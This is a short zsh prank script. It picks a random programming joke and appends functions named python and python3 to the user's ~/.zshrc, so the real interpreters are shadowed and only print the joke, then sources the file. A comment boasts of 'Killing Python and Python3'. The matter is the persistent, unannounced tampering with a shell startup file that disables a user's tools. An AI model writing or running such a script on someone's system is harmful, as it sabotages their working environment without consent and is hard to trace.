#!/bin/zsh

ZSHRC_FILE="$HOME/.zshrc"

JOKES=(
  "Why don't Python programmers like nature? Because it has too many bugs!"
  "Why did the Python developer break up with their partner? They couldn’t find the right class!"
  "I told my computer I needed a break, and it froze."
  "Why did the function go to therapy? It had too many arguments."
  "Python is the only language that is both serpentine and friendly."
  "Why don’t programmers like to go outside? The bugs are worse there."
  "There are only two hard things in programming: cache invalidation and naming things."
  "Why do Python programmers prefer dark mode? Because the light attracts bugs!"
  "A SQL query walks into a bar, walks up to two tables and asks, 'Can I join you?'"
  "Why did the Python programmer get stuck in the elevator? They forgot to \`import lift\`."
  "Why don't Java developers wear glasses? Because they can’t C#!"
  "I’m not arguing, I’m just explaining why I’m right... in Python."
  "Why do JavaScript developers prefer to avoid nature walks? Too many callbacks."
  "How many programmers does it take to change a light bulb? None, that's a hardware issue!"
)

JOKE=${JOKES[$((RANDOM % ${#JOKES[@]}))]}

## Muhahahahah Killing Python and Python3
if ! grep -q "function python()" "$ZSHRC_FILE"; then
  echo "
  function python() {
    echo \"$JOKE\"
  }
  " >> "$ZSHRC_FILE"
fi

if ! grep -q "function python3()" "$ZSHRC_FILE"; then
  echo "
  function python3() {
    echo \"$JOKE\"
  }
  " >> "$ZSHRC_FILE"
fi

source "$ZSHRC_FILE" > /dev/null 2>&1
